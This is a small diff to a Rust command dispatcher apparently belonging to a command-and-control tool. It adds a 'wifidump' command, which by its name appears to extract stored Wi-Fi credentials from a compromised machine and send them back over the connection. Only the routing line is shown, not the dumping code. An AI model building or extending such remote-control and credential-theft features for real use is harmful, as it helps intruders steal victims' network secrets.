@@ -18,6 +18,7 @@ pub fn dispatch_client(instruct: Vec<&str>, conn: &mut TcpStream, state: &C2Stat
 
         // System commands
         Some(&"sysinfo") => client::system::sysinfo(conn),
+        Some(&"wifidump") => client::system::wifidump(conn),
         Some(&"check") => client::system::check_permissions(conn),
         Some(&"display") => client::system::display(&instruct, conn),
 
